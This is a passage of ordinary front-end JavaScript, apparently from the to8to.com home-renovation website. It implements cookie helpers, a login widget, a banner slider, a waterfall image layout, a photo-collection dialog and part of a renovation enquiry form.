// JavaScript Document 
//xiaoguotu_common 
var server_host='/';
var rankhelp_doc='/help/rankhelp.html';
var isIE=navigator.userAgent.indexOf("compatible")>-1&&navigator.userAgent.indexOf("MSIE")>-1&&(navigator.appName!=="Oprea");
var isIE7=(isIE&&window.XMLHttpRequest)?true:false;
var isIE6=(isIE&&!window.XMLHttpRequest&&window.ActiveXObject)?true:false;
var isFirefox=navigator.userAgent.indexOf('Firefox')==-1?false:true;
var userAgent=navigator.userAgent.toLowerCase();
var is_opera=userAgent.indexOf('opera')!=-1&&opera.version();
var is_moz=(navigator.product=='Gecko')&&userAgent.substr(userAgent.indexOf('firefox')+8,3);
var is_ie=(userAgent.indexOf('msie')!=-1&&!is_opera)&&userAgent.substr(userAgent.indexOf('msie')+5,3);
var isWin=(navigator.platform=="Win32")||(navigator.platform=="Windows");
var to8to_uid=getCookie('uid',1);var to8to_ind=getCookie('ind',1);
var divTop,divLeft,divWidth,divHeight,docHeight,docWidth,objTimer,secI;
if((window.location.href.indexOf(".to8to.com")!=-1)){
	server_host="http://www.to8to.com/";
}
document.domain = "to8to.com";

function slideLine(ul,delay,speed,lh,stepvalue){
	var slideBox=(typeof ul=='string')?document.getElementById(ul):ul;
	var slideBox2=(typeof ul=='string')?document.getElementById(ul):ul;
	for(var i=0;i<slideBox2.childNodes.length;i++){
		if(slideBox2.childNodes[i].nodeType==1){
			if(slideBox2.childNodes[i].tagName=="UL")
				slideBox2=slideBox2.childNodes[i];break;
		}
	};
	var delay=delay||1000,speed=speed||0,lh=lh||1,stepvalue=stepvalue||2;
	var tid=null,pause=false;
	var start=function(){tid=setInterval(slide,speed);}
	function slide(){
		if(pause)
			return;
		slideBox.scrollTop+=stepvalue;
		if(slideBox.scrollTop%lh==0){
			clearInterval(tid);
			slideBox2.appendChild(slideBox2.getElementsByTagName('li')[0]);
			slideBox.scrollTop=0;setTimeout(start,delay);
		};
	};
	slideBox.onmouseover=function(){pause=true;}
	slideBox.onmouseout=function(){pause=false;}
	setTimeout(start,delay);
}
	
function getCookie(name,pre)
{
	if(pre)
		name='to8to_'+name;
	var r=new RegExp("(\\b)"+name+"=([^;]*)(;|$)");
	var m=document.cookie.match(r);
	return(!m?"":decodeURIComponent(m[2]));
}

function uicheck(){
	var fullpath="";
	username=getCookie('username',1);
	if((window.location.href.indexOf(".to8to.com")!=-1)){
		fullpath="http://www.to8to.com";
	};
	if(typeof(username)!='undefined'&&username!=""&&username!="deleted"){
		ind=getCookie('ind',1);
		uid=getCookie('uid',1);
		mysite=fullpath+'/my/';
		if($('loginchg'))
			$('loginchg').innerHTML='您好，<a href="'+mysite+'" target="_blank">'+username+'</a>　[<a href="'+mysite+'" target="_blank" class="f60">我的管理中心</a>] [<a href="'+fullpath+'/logout.php?uid='+uid+'" target="_self">安全退出</a>]';
	};
	if(document.referrer!=""&&document.referrer.indexOf("to8to.com")==-1){
		if(window.location.href.indexOf("to8to.com")!=-1){
			smallwindow();getMsg();
		};
	};
	to8toyx();
}
function smallwindow(){};
function getMsg(){
	try{
		secI=0;
		divTop=parseInt(document.getElementById("eMeng").style.top,10)
		divLeft=parseInt(document.getElementById("eMeng").style.left,10)
		divHeight=parseInt(document.getElementById("eMeng").offsetHeight,10)
		divWidth=parseInt(document.getElementById("eMeng").offsetWidth,10)
		docWidth=document.documentElement.clientWidth;
		docHeight=document.documentElement.clientHeight;document.getElementById("eMeng").style.display="block";
		document.getElementById("eMeng").style.top=parseInt(document.documentElement.scrollTop,10)+docHeight+10;
		document.getElementById("eMeng").style.left=parseInt(document.documentElement.scrollLeft,10)+docWidth-divWidth;
		document.getElementById("eMeng").style.visibility="visible";objTimer=window.setInterval("moveDiv()",10)
	}catch(e){};
}
function to8toyx(){
	url=window.location.href;
	if(null==url||url.indexOf("?")==-1){return null;}
	var argsUrl=url.split("?")[1];
	if(argsUrl.indexOf("=")==-1){return null;}
	if(argsUrl.indexOf("welcome=")!=-1){
		href="http://www.to8to.com/getuserdata.php?pos=to8toyx&"+argsUrl;href+='&s='+Math.random(5);insertScript('sInsertScript',href);
	}else{
		return null;
	}
}



function autoSize(obj,w,h){
	var oIMG=new Image()
	oIMG.onload=function(){
		var oW=this.width;
		var oH=this.height;var tax=1;
		if(oW>w||oH>h)
			tax=(oW/oH)>(w/h)?(w/oW):(h/oH);
			obj.style.marginLeft=(w-Math.floor(oW*tax))/2+"px";
			obj.style.marginTop=(h-Math.floor(oH*tax))/2+"px";
			obj.width=oW*tax;
			obj.height=oH*tax;
		};
	oIMG.src=obj.src;
}

function setCookie(name,value,expire,pre){
	if(!expire)
		expire=5000;
	if(pre)
		name='to8to_'+name;
	var expiry=new Date();
	expiry.setTime(expiry.getTime()+expire);
	document.cookie=name+'='+value+';expires='+expiry.toGMTString()+';path=/;domain=.to8to.com';
};
function insertScript(id,url){
	var oScript=$(id);
	if(oScript)
		oScript.parentNode.removeChild(oScript);
	oScript=document.createElement('script');
	oScript.setAttribute('id',id);
	oScript.setAttribute('src',url);
	oScript.setAttribute('type','text/javascript');
	oScript.setAttribute('language','javascript');
	var header=$('head').item(0);
	header.appendChild(oScript);
}
function xiaoguotu_upl(){
	if(to8to_ind && to8to_uid){
		user_upload();
	}else{
		noLogin_button();	
	};
}
function user_upload(){
	switch(to8to_ind){
		case 'yz': window.open('http://www.to8to.com/yz/photo.php?act=upload&uid='+to8to_uid);break;
		case 'sjs':	window.open('http://www.shejiben.com/my/case_upload.php');break;
		case 'zs':	window.open('http://www.to8to.com/zs/case.php?act=upload&uid='+to8to_uid+'&gate=0');break;
		default : alert("无法上传");
	}	
}
function noLogin_button(){
	var uid=getCookie('uid',true);
	if(!uid)
		return showSingleLogin(2);
	return true;
}
function showSingleLogin(n){
	var goUrl='http://www.to8to.com/pop_login.php';
	if(n&&parseInt(n))
		goUrl='http://www.to8to.com/pop_login.php?id='+parseInt(n);
	var oJsLoader=new jsLoader();
	oJsLoader.onsuccess=function(){
		editPhotoCat(goUrl,'登陆',360,250);
	}
	oJsLoader.load('http://www.to8to.com/gb_js/popup.js');
	return false;
}
function jsLoader(){
	this.load=function(f){
		var oTags=document.getElementsByTagName('script');
		for(i=oTags.length-1;i>=0;i--){
			var src=oTags[i].src;
			if(src&&src.indexOf(f)>-1){
				this.onsuccess();return;
			};
		};
		var s=document.createElement('script');
		var header=document.getElementsByTagName('head').item(0);
		s.setAttribute('src',f);
		s.setAttribute('type','text/javascript');
		s.setAttribute('language','javascript');
		header.appendChild(s);
		var _self=this;
		s.onload=s.onreadystatechange=function(){
			if(this.readyState&&this.readyState=="loading")
				return;_self.onsuccess();
		};
		s.onerror=function(){
			header.removeChild(s);
			_self.onfailure();
		};
	};
	this.onfailure=function(){};
	this.onsuccess=function(){};
}
//添加收藏夹
function addfav(url,title) {
    if (document.all) {
        window.external.addFavorite(url, title);
    }else if (window.sidebar) {
        window.sidebar.addPanel(title, url, "");
    }else {
        alert("请按Ctrl+D收藏!");
    };
    return false;
}


// 效果图banner slider
!function(jq){
	jq.fn.xgtSlider = function(settings){
		if(!this.length){returnFalse();};
		settings=jq.extend({},jq.xgtSlider.defaults,settings);
		var obj = this,
		    scroller = {};
		scroller.fn = {};
		scroller.itemWrap = obj.find('div.new_xgt_slider');
		scroller.item = scroller.itemWrap.find('div.nx_layer');
		scroller.itemSum = scroller.item.length;
		scroller.bLeftBtn= jq(".bLeft");
		scroller.bRightBtn=jq(".bRight");
		scroller.isNow = 0;
		if(settings.fontLi) {
			scroller.font = jq('.slider_font');
			scroller.fontLi  =jq('.slider_font').find('li');
			scroller.font.find('li[class="'+settings.play+'"]').css("opacity","1");
		}
        scroller.fn.on=function(){
			if(!settings.auto){return;};
			scroller.fn.off();
			scroller.fn.removeControl();
            scroller.fn.addControl();
			jq('.'+settings.numClass+'').html('<em>1</em>/'+scroller.itemSum+'');
			scroller.run=setTimeout(function(){
				scroller.fn.goto(settings.direction);
			},6000);
		};
		// 方法：停止
		scroller.fn.off=function(){
			if(typeof(scroller.run)!=="undefined"){clearTimeout(scroller.run);};
		};
		// 方法：增加控制
		scroller.fn.addControl=function(){
			if(settings.bLeft&&scroller.bLeftBtn.length){
				scroller.bLeftBtn.bind("click",function(){
					scroller.fn.goto("bLeft");
				});
			};
			if(settings.bRight&&scroller.bRightBtn.length){
				scroller.bRightBtn.bind("click",function(){
					scroller.fn.goto("bRight");
				});
			};
		};
		// 方法：解除控制
		scroller.fn.removeControl=function(){
			if(scroller.bLeftBtn.length){scroller.bLeftBtn.unbind("click");};
			if(scroller.bRightBtn.length){scroller.bRightBtn.unbind("click");};
		};
		// 方法：滚动
		scroller.fn.goto=function(d){
			scroller.fn.off();
			scroller.fn.removeControl();
			obj.stop(true);

			scroller.fontLi.removeClass(''+settings.play+'');
			switch(d){
				case "bRight":
                  scroller.isNow++;
                  if(scroller.isNow == scroller.itemSum){
                  	scroller.isNow = 0;
                  }
                  scroller.item.eq(scroller.isNow).addClass(''+settings.play+'').siblings().removeClass(''+settings.play+'');
                  scroller.item.eq(scroller.isNow).siblings().stop().animate({
                  	opacity:0,
                  	filter:"alpha(opacity=0)",
                    'z-index':1
              
                  },settings.speed);
                  scroller.item.eq(scroller.isNow).animate({
                  	opacity:1,
                  	filter:"alpha(opacity=100)",
                  	'z-index':2
           
                  },settings.speed)
                  if(settings.fontLi){
                  	var fontNum = scroller.isNow +1;
                  	jq('.'+settings.numClass+'').html("<em>"+fontNum+"</em> / "  + scroller.itemSum);
                  	scroller.fontLi.eq(scroller.isNow).siblings().removeClass(''+settings.play+'').animate({opacity:"0"},settings.speed);
                  	scroller.fontLi.eq(scroller.isNow).addClass(''+settings.play+'').animate({opacity:"1"},settings.speed);

                  }

				break;
			  case "bLeft":
			   if(scroller.isNow == 0){
	              scroller.isNow = scroller.itemSum;
	            }
			    scroller.isNow--;

	            
	            scroller.item.eq(scroller.isNow).addClass(''+settings.play+'').siblings().removeClass(''+settings.play+'');
                  scroller.item.eq(scroller.isNow).siblings().stop().animate({
                  	opacity:0,
                  	filter:"alpha(opacity=0)",
                    'z-index':1
              
                  },settings.speed);
                  scroller.item.eq(scroller.isNow).animate({
                  	opacity:1,
                  	filter:"alpha(opacity=100)",
                  	'z-index':2
           
                  },settings.speed)
                  if(settings.fontLi){
                  	var fontNum;
                  	if(scroller.isNow == 0 ){
                       fontNum = 1;
                  	}else{
                  	   fontNum = scroller.isNow + 1;	
                  	}
                  
                  	jq('.'+settings.numClass+'').html("<em>"+fontNum+"</em> / "  + scroller.itemSum);
                  	scroller.fontLi.eq(scroller.isNow).siblings().removeClass(''+settings.play+'').animate({opacity:"0"},settings.speed);
                  	scroller.fontLi.eq(scroller.isNow).addClass(''+settings.play+'').animate({opacity:"1"},settings.speed);

                  }

			  break;
			}
			obj.queue(function(){
				scroller.fn.addControl();
				scroller.run=setTimeout(function(){
					scroller.fn.goto(settings.direction);
				},settings.time);
				jq(this).dequeue();
			});
		}

		scroller.fn.on();
        
	}
	
	// 默认值
	jq.xgtSlider={defaults:{
	    speed:800,			// 滚动速度
		time:4000,			// 自动滚动间隔时间
	    play:"on",         //选中样式
		num:true,        //是否出现总数
		numClass:"slider_num" ,    // 总数显示区域
		auto:true,
		bLeft:true,                 //左控
		bRight:true ,            //右控
		direction:"bRight",  // 顺序
		fontLi:true,             //是否开启描述
		bgColor:"",             //背景色值
		bgLayer:""              //背景色层
	}};
}(jQuery);
//瀑布流
;(function(jq,window,document,undefined){'use strict';var $window=jq(window),pluginName='waterfall',defaults={itemCls:'waterfall-item',prefix:'waterfall',fitWidth:true,colWidth:240,gutterWidth:10,gutterHeight:10,align:'center',minCol:1,maxCol:undefined,maxPage:undefined,bufferPixel:-50,containerStyle:{position:'relative'},resizable:true,isFadeIn:false,isAnimated:true,animationOptions:{},isAutoPrefill:false,checkImagesLoaded:true,params:{},headers:{},state:{isDuringAjax:false,isProcessingData:false,isResizing:false,isPause:false,curPage:1},debug:false};function Waterfall(element,options){this.$element=jq(element);this.options=jq.extend(true,{},defaults,options);this.colHeightArray=[];this.styleQueue=[];this._init()}Waterfall.prototype={constructor:Waterfall,_debug:function(){if(true!==this.options.debug){return};if(typeof console!=='undefined'&&typeof console.log==='function'){if((Array.prototype.slice.call(arguments)).length===1&&typeof Array.prototype.slice.call(arguments)[0]==='string'){console.log((Array.prototype.slice.call(arguments)).toString())}else{console.log(Array.prototype.slice.call(arguments))}}else if(!Function.prototype.bind&&typeof console!=='undefined'&&typeof console.log==='object'){Function.prototype.call.call(console.log,console,Array.prototype.slice.call(arguments))}},_init:function(callback){var options=this.options;this._setColumns();this._resetColumnsHeightArray();this.reLayout(callback);if(options.isAutoPrefill){};if(options.resizable){this._doResize()}},_getColumns:function(){var options=this.options,$container=options.fitWidth?this.$element.parent():this.$element,containerWidth=$container[0].tagName==='BODY'?$container.width()-20:$container.width(),colWidth=options.colWidth,gutterWidth=options.gutterWidth,minCol=options.minCol,maxCol=options.maxCol,cols=Math.floor((containerWidth+gutterWidth)/(colWidth+gutterWidth)),col=Math.max(cols,minCol);return!maxCol?col:(col>maxCol?maxCol:col)},_setColumns:function(){this.cols=this._getColumns()},_getItems:function($content){var $items=$content.filter('.'+this.options.itemCls).css({'position':'absolute'});return $items},_resetColumnsHeightArray:function(){var cols=this.cols,i;this.colHeightArray.length=cols;for(i=0;i<cols;i++){this.colHeightArray[i]=0}},layout:function($content,callback){var options=this.options,$items=this.options.isFadeIn?this._getItems($content).css({opacity:0}).animate({opacity:1}):this._getItems($content),styleFn=(this.options.isAnimated&&this.options.state.isResizing)?'animate':'css',animationOptions=options.animationOptions,colWidth=options.colWidth,gutterWidth=options.gutterWidth,len=this.colHeightArray.length,align=options.align,fixMarginLeft,obj,i,j,itemsLen,styleLen;this.$element.append($items);if(align==='center'){fixMarginLeft=(this.$element.width()-colWidth*len-gutterWidth*(len-1))/2;fixMarginLeft=fixMarginLeft>0?fixMarginLeft:0}else if(align==='left'){fixMarginLeft=0}else if(align==='right'){fixMarginLeft=this.$element.width()-colWidth*len-gutterWidth*(len-1)};for(i=0,itemsLen=$items.length;i<itemsLen;i++){this._placeItems($items[i],fixMarginLeft)};for(j=0,styleLen=this.styleQueue.length;j<styleLen;j++){obj=this.styleQueue[j];obj.$el[styleFn](obj.style,animationOptions)};this.$element.height(Math.max.apply({},this.colHeightArray));this.styleQueue=[];this.options.state.isResizing=false;this.options.state.isProcessingData=false},reLayout:function(callback){var $content=this.$element.find('.'+this.options.itemCls);this._resetColumnsHeightArray();this.layout($content,callback);this.$element.parent().attr('style','');this.$element.parent().find('div.new_loading').hide()},_placeItems:function(item,fixMarginLeft){var $item=jq(item),options=this.options,colWidth=options.colWidth,gutterWidth=options.gutterWidth,gutterHeight=options.gutterHeight,colHeightArray=this.colHeightArray,len=colHeightArray.length,minColHeight=Math.min.apply({},colHeightArray),minColIndex=jq.inArray(minColHeight,colHeightArray),colIndex,position;colIndex=minColIndex;position={left:(colWidth+gutterWidth)*colIndex+fixMarginLeft,top:colHeightArray[colIndex]};this.styleQueue.push({$el:$item,style:position});colHeightArray[colIndex]+=$item.outerHeight()+gutterHeight},removeItems:function($items,callback){this.$element.find($items).remove();this.reLayout(callback)},pause:function(callback){this.options.state.isPause=true;if(typeof callback==='function'){callback()}},resume:function(callback){this.options.state.isPause=false;if(typeof callback==='function'){callback()}},_resize:function(){var cols=this.cols,newCols=this._getColumns();if(newCols!==cols||this.options.align!=='left'){this.options.state.isResizing=true;this.cols=newCols;this.reLayout()}},_doResize:function(){var self=this,resizeTimer;$window.bind('resize',function(){if(resizeTimer){clearTimeout(resizeTimer)};resizeTimer=setTimeout(function(){self._resize()},1000)})}};jq.fn[pluginName]=function(options){if(typeof options==='string'){var args=Array.prototype.slice.call(arguments,1);this.each(function(){var instance=jq.data(this,'plugin_'+pluginName);if(!instance){instance._debug('instance is not initialization');return}if(!jq.isFunction(instance[options])||options.charAt(0)==='_'){instance._debug('no such method "'+options+'"');return}instance[options].apply(instance,args)})}else{this.each(function(){if(!jq.data(this,'plugin_'+pluginName)){jq.data(this,'plugin_'+pluginName,new Waterfall(this,options))}})};return this}}(jQuery,window,document));


//End
!function(){
	var a = {
		init:function(b){
			xgt_layer(b);
		}
	};
	var rank = {
		init:function(b){
			xgt_rank(b)
		}
	};
	function xgt_layer(b){
		var obj = {};
		       obj.fn ={};
		       obj.fn.li = jq('.'+b+'').find('li');
        obj.fn.li.mouseenter(function(){
			if(jq(this).hasClass('xgt_photos_name')) return false;
		//	if(jq(this).find('a > div.xpn_layer_content').length > 0) return false;
		    var objHeight = jq(this).height();
			jq(this).find('a > div.xpn_layer').animate({
				bottom:"0",
				width:"100%",
				height:objHeight
			},0);
			obj.fn.content = jq(this).find('a > span').html();
			jq(this).find('a > span').hide();
            jq(this).find('div.xpn_layer_content').show()
			/*obj.fn.str = "<div class=\"xpn_layer_content\"><p></p><em>100</em><h6>"+obj.fn.content+"</h6><b></b></div>";//字符串如果同步读取，就把这句复制
			jq(this).find('a').append(obj.fn.str);*/
		});
		obj.fn.li.mouseleave(function(){
			var m = 195;
			if(jq(this).hasClass('xgt_photos_name')) return false;
			if(jq(this).hasClass('xgt_photos_big')) m = 215;
			if(jq(this).find('a > div.xpn_layer_content').length < 1) return false;
			jq(this).find('a > div.xpn_layer_content').hide();
			jq(this).find('a > div.xpn_layer').animate({
				bottom:"19",
				width:m,
				height:"36"
			},0);
			jq(this).find('a > span').show();
		});
	};
	function xgt_rank(b){
		var obj = {};
		obj.fn = {};
		obj.fn.li = jq('.'+b+'').find('li');
		obj.fn.li.mouseenter(function(){
			obj.fn.li.removeClass('on');
			jq(this).addClass('on');
		});
		
	}
	window.xgtLayer = a;
	window.xgtRank = rank;
}(jQuery)

!(function(){
	var a = {
		init:function(){
			meitu_doc_ready();
		}
	}
    function meitu_doc_ready(){
				
		var str = '<a href="javascript:void(0)" class="xgt_nav_showMore" onClick="javascript:showMore(this)" title="点击展开"></a>'
		jq('.xgt_st_dl >dd').each(function(index, element) {
            if(jq(this).height() > 40){
				jq(this).parent().addClass('height_40');
				jq(this).parent().append(str);
			}
        });
        jq('.xgt_select_type > dl > dd > a').on("click", function(){
		jq(this).parent().find('a').removeClass('on');
		jq(this).addClass('on');
	});
		jq('.xgt_st_sorts > a').on("click", function(){
			jq('.xgt_st_sorts > a').removeClass('on');
			jq(this).addClass('on');
		});

		jq('.xmp_container > .item > span').mouseenter(function(){
		
			if(jq(this).find('a.free_design').length>0) return false;
			var str = '<a href="javascript:void(0)" onClick="freeDesign(this,event)" class="free_design">免费户型设计</a><a href="javascript:void(0)" class="meitu_collection" onClick="collectionBox(this,event)"><em></em><b>收藏</b></a>',
			    xisHeight = jq(this).height(),
			    strTwo = '<em class="tranLayer" style="height:'+xisHeight+'px"></em>';

			jq(this).append(str);
			jq(this).find('a.item_img').append(strTwo);
		});
		jq('.xmp_container > .item > span').mouseleave(function(){
			jq(this).find('a.free_design').remove();
			jq(this).find('a.meitu_collection').remove();
			jq(this).find('a.item_img > em.tranLayer').remove();
		});
		jq('.xgt_search_select > ul > li').on("click", function(){
			jq('.xgt_search_select > ul > li').removeClass('on');
			jq(this).addClass('on');
		});
	}
	
	window.meituDocReady = a;
})(jQuery)

function collectionBox(thisObj,e)
{
	  var oldaid   = jq(thisObj).parents(".item").attr("oldaid");
	  var oldcid   = jq(thisObj).parents(".item").attr("oldcid");
	  var width    = jq(thisObj).parents(".item").attr("original_width");
	  var height   = jq(thisObj).parents(".item").attr("original_height");
	  var title    = jq(thisObj).parent().next().children("a").text();
	  var filename = jq(thisObj).prev().prev().children("img").attr("src");
	  var picNum   = jq(thisObj).parent().next().children("em").text();


	  jq('#show_img').attr("oldaid",oldaid);
	  jq('#show_img').attr("oldcid",oldcid);
	  jq('#show_img').attr("width",width);
	  jq('#show_img').attr("height",height);
	  jq('#show_img').attr("title",title);
	  jq('#show_img').attr("filename",filename.replace("_284",'').replace('smallcase','case'));

	  openCollectionBox(picNum);
}


function openCollectionBox(picNum){
	  var display  = '',
	      wb_height = 321;
	   switch(picType)
	   {
	   case 0:
	   		try{clickStream.getCvParams('1_2_2_10');}catch(e){};
	   		break;
	   case 1:	
	   		try{clickStream.getCvParams('1_2_2_9');}catch(e){};
	   		break;
	   default:
	        try{clickStream.getCvParams('1_2_1_3');}catch(e){};
	   		break;
	   	}

	  if (picType!="0") 
	  {
		display='style="display:none;"';
	    wb_height = 300;
	  }
      if(checkLogin('yz, sjs, zs_sjs'))
      {
            var uid = getCookie('to8to_uid');
            var tid = getCookie('to8to_fcm_tid');
                tid = tid > 0 ? tid : 0;
            var url = '/collection.php?type=1';
            var data = {uid: uid, tid: tid};
			var albumList = '';
			var new_album_name = '';
            jq.post(url, data ,function(message){
                if(message)
                {
                    jq.each(message,function(i,data){
                        albumList += '<option value="'+data.xfid+'">'+data.name+'</option>';
                    });


                    jq('.window_box').windowBox({
							width:480,    //弹框宽度
							height:wb_height,   //弹框高度
							title:"收藏", //标题
							wbcStr:'<div class="collection_box_content clear"><dl '+display+' class="cbc_dl_one"><dt>收藏内容</dt><dd><div class="cb_item"><input name="collect_type" class="cbc_radio" type="radio" checked="checked" value="1"><span  class="collect_span">收藏单张图片</span></div><div class="cb_item"><input name="collect_type" class="cbc_radio" value="2" type="radio"><span  class="collect_span">收藏整套图片（共'+parseInt(picNum)+'张）</span></div></dd></dl><dl class="cbc_dl_two"><dt>选择专辑</dt><dd><div class="cb_item"><input name="album_type" checked="checked" value=1 type="radio" class="cbc_radio" ><span  class="collect_span">现有专辑</span><select name="album_select">'+albumList+'</select></div><div class="cb_item"><input name="album_type" class="cbc_radio"  value=2 type="radio" ><span  class="collect_span">新建专辑</span><input name="new_album_input" class="cbc_text" type="text"/></div></dd></dl></div>',  //可编辑内容
							cancleBtn:true,    //是否显示取消按钮
							confirmBtn:true  // 是否显示确认按钮
					});
					jq('.cbc_text[name="new_album_input"]').blur(function(){
						var cbcStr = '<span class="window_box_collectError window_box_error"><em></em>专辑名不能为空</span>';
						if(jq(this).val() == ""){
							jq('.cbc_text[name="new_album_input"]').css('border-color',"#ff6767");
	                        jq('.cbc_text[name="new_album_input"]').parent().css("height","auto");
							if(jq('.cbc_text[name="new_album_input"]').next().length ==0)
			                {
			                  jq('.cbc_text[name="new_album_input"]').after(cbcStr);
			                }

						}else{
							jq(this).parent().find('span.window_box_error').remove();
							jq('.cbc_text[name="new_album_input"]').css('border-color',"#ccc");
						}
						


					});
					jq('.cbc_text[name="new_album_input"]').focus(function(){
						jq(this).parent().find('span.window_box_error').remove();
						jq('.cbc_text[name="new_album_input"]').css('border-color',"#ccc");
					});
                }
            },'json');

      }
      

	
}



function showMore(a){
	var obj = jq(a);
	if(!obj.hasClass('showMore_down')){
		obj.attr('title', '点击收缩').addClass('showMore_down');
		obj.parent().addClass('height_auto');
	}else{
		obj.attr('title', '点击展开').removeClass('showMore_down');
		obj.parent().removeClass('height_auto');
	}
}

!(function(){
	var a = {
		init:function(){
			xgtTopicDocReady();
		}
	};
	function xgtTopicDocReady(){
		var $xta = jq('.xgt_topic > .topic_item > a')
		$xta.on('mouseenter', function(){
			if(jq(this).find('div.tranLayer').length >0 ) return false;
			var str = '<div class="tranLayer"></div>';
			jq(this).append(str);
		});
		$xta.on('mouseleave', function(){
              jq(this).find('div.tranLayer').remove();
		});
	}
	window.xgtTopic = a;
})(jQuery)

!(function(){
	var a = {
		init:function(){
		    xgtDetails();
		}
	}
	function xgtDetails(){
		var browserType  = checkBrowser();
		/*if((browserType.name == "msie" && browserType.version =="6") || browserType.name =="trident"){
			jq('.xgt_details_img').remove();
			jq('body').css('background-color','#f8f8f8');
			
		}else{
			jq('.xgt_details_transLayer').show();
			jq('.xgt_details_img').show();

		}*/
	};
	window.topicDetails = a;
})(jQuery)




//完善招标资料
function indexSubZbStepOneXGT(res,weixin_code){
	if(res.status==1) {
		window_box_close();

        var str = '<div class="mod_fbbox">'+
            '<div class="fbbox_s2">'+
                '<h3 class="fbbox_s2_t">恭喜您申请成功！</h3>'+
                '<p class="fbbox_s2_text">客服将在24小时之内联系您，请保持手机通畅。现在请您完善详细资料，以便我们尽快为您安排服务。</p>'+
                '<div class="clear">';
				 if(res.sendmobiletime==''||res.sendmobiletime==0||typeof(res.sendmobiletime)=='undefined'||res.sendmobiletime==null){
					 str +='<div class="s2_line">'+
							'<label for="" class="label"><span>*</span>&nbsp;量房时间</label>'+
							'<div class="s2_element">'+
							  '<div>'+
								'<select class="select" name="sendmobiletime" id="sendmobiletime" style="border-color: rgb(221, 221, 221);">'+
								  '<option value="今天内">今天内</option>'+
								  '<option value="明天">明天</option>'+
								  '<option value="三天内">三天内</option>'+
								  '<option value="近一周内">近一周内</option>'+
								  '<option value="一周以上">一周以上</option>'+
								'</select>'+
							  '</div>'+
							'</div>'+
						  '</div>';
				 }
                   if(res.oarea==''||res.oarea==0||typeof(res.oarea)=='undefined'||res.oarea==null){
					 str +='<div class="s2_line">'+
							'<label for="" class="label"><span>*</span>&nbsp;装修面积</label>'+
							'<div class="s2_element">'+
							  '<div>'+
								'<input type="text" class="text" name="oarea" id="oarea" maxlength="4" style="border-color: rgb(221, 221, 221);"><em class="text_uni">㎡</em>'+
							  '</div>'+
							  '<div class="err_tip" style="display: none;">'+
								'<span class="ico_error"></span>请填写合理的面积'+
							  '</div>'+
                              '<div class="err_tip" style="display: none;">'+
                                '<span class="ico_error"></span>面积必须小于9999'+
                              '</div>'+
							'</div>'+
						  '</div>';
					}
				   if(res.zxtime==''||res.zxtime==0||typeof(res.zxtime)=='undefined'||res.zxtime==null){
					 str += '<div class="s2_line">'+
							'<label for="" class="label"><span>*</span>&nbsp;装修时间</label>'+
							'<div class="s2_element">'+
							  '<div>'+
								'<select class="select" name="zxtime" id="zxtime" style="border-color: rgb(221, 221, 221);">'+
								  '<option value="半个月内">半个月内</option>'+
								  '<option value="1个月">1个月</option>'+
								  '<option value="2个月">2个月</option>'+
								  '<option value="2个月以上">2个月以上</option>'+
								'</select>'+
							  '</div>'+
							'</div>'+
						  '</div>';
					}
				   if(res.hometype==''||res.hometype==0||typeof(res.hometype)=='undefined'||res.hometype==null){
					str += '<div class="s2_line">'+
							'<label for="" class="label"><span>*</span>&nbsp;房屋类型</label>'+
							'<div class="s2_element">'+
							  '<div>'+
								'<select class="select" name="hometype" id="hometype" style="border-color: rgb(221, 221, 221);">'+
								  '<option value="1">住宅公寓</option>'+
								  '<option value="2">别墅</option>'+
								  '<option value="4">商场</option>'+
								  '<option value="21">其他</option>'+
								  
								'</select>'+
							  '</div>'+
							'</div>'+
						  '</div>';
				  }

                if(res.zxys==''||res.zxys==0||typeof(res.zxys)=='undefined'||res.zxys==null){
                  str += '<div class="s2_line">'+
                            '<label for="" class="label"><span>*</span>&nbsp;装修预算</label>'+
                            '<div class="s2_element">'+
                              '<div>'+
                                '<select class="select" name="zxys" id="zxys" style="border-color: rgb(221, 221, 221);">'+
                                  '<option value="3万以下">3万以下</option>'+
                                  '<option value="3-5万">3-5万</option>'+
                                  '<option value="5-8万">5-8万</option>'+
                                  '<option value="8-12万">8-12万</option>'+
                                  '<option value="12-18万">12-18万</option>'+
                                  '<option value="18-25万">18-25万</option>'+
								  '<option value="25-30万">25-30万</option>'+
                                  '<option value="30万以上">30万以上</option>'+
                                '</select>'+
                              '</div>'+
                            '</div>'+
                          '</div>';
                }  


                if(res.zxtype==''||res.zxtype==0||typeof(res.zxtype)=='undefined'||res.zxtype==null) {
                  str += '<div class="s2_line">'+
                            '<label for="" class="label"><span>*</span>&nbsp;装修类型</label>'+
                            '<div class="s2_element">'+
                              '<div>'+
                                '<select class="select" name="zxtype" id="zxtype" style="border-color: rgb(221, 221, 221);">'+
                                  '<option value="1" selected="">半包</option>'+
                                  '<option value="2">全包</option>'+
                                '</select>'+
                              '</div>'+
                            '</div>'+
                          '</div>';
                } 

                // if(res.shen==''||res.shen==0||typeof(res.shen)=='undefined') {
                //   str +='<div class="s2_line">'+
                //             '<label for="" class="label">所在城市</label>'+
                //             '<div class="s2_element">'+
                //                 '<div class="clear">'+
                //                     '<select  class="select select_s" id="User_Shen"  name="User_Shen" onChange="changeProvince('+"User_Shen"+','+"User_City"+','+"User_Town"+');"></select>'+
                //                     '<select  class="select select_s" id="User_City" name="User_City" ></select><div style="display:none"><select name="User_Town" id="User_Town" style="display:none"><option value="">'+'--</option></select></div>'+
                //                 '</div>'+
                //                 '<div class="err_tip"  style="display:none"><span class="ico_error"></span>请选择城市名称</div>'+
                //             '</div>'+
                //         '</div>';
                // } else {
                //     str += '<input type="hidden" id="User_Shen_1" value="'+res.shen+'" name="User_Shen"><input type="hidden" id="User_City_1" value="'+res.city+'" name="User_City">';
                // };

                str += '</div>';

                if(res.address==''||res.address==0||typeof(res.address)=='undefined'||res.address==null) {
                  str += '<div class="s2_line_b">'+
                          '<label for="" class="label">楼盘名称</label>'+
                          '<div class="s2_element">'+
                              '<div>'+
                                '<input class="text" type="text" style="border-color: rgb(221, 221, 221);" name="address" id="address">'+
                              '</div>'+
                          '</div>'+
                        '</div>';
				}
                        str += '<input type="hidden" id="User_City_1" value="'+res.city+'" name="User_City"><input type="hidden" value="'+res.tmpYid+'" name="tyid" id="tyid"><input type="button" value="提交" class="mod_fbbox_btn" onclick="selectConfirmZbOverXGT();">'+
                        '<div class="service_img_box clear" style="display:none">'+
                          '<div class="service_img">'+
                            '<p class="service_img_text"><i class="ico_code_s"></i>如需关注项目进展，请扫二维码</p>'+
                            '<img src="'+weixin_code+'" alt="" id="weixin_img" style="width:100px;height:100px">'+
                            '<div class="mod_pagetip mod_pagetip_s mod_pagetips_noinfo" id="status_success" style="display:none">'+
